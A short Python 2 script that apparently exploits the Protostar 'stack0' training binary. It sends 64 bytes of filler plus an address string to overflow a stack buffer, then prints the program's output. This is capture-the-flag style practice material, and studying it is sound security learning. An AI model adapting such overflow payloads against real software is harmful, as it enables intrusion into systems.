#!/usr/bin/env python2.6

from utils import run_file_with_stdin

buff = "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVVWWWXXXYYYZZZ111222333444555666777888999000"

addr = 0x8048424

payload = buff[:64] + "%x" % addr

stdin, stderr = run_file_with_stdin("/opt/protostar/bin/stack0", payload)
print stdin
print "\n----------------------\n"
print stderr
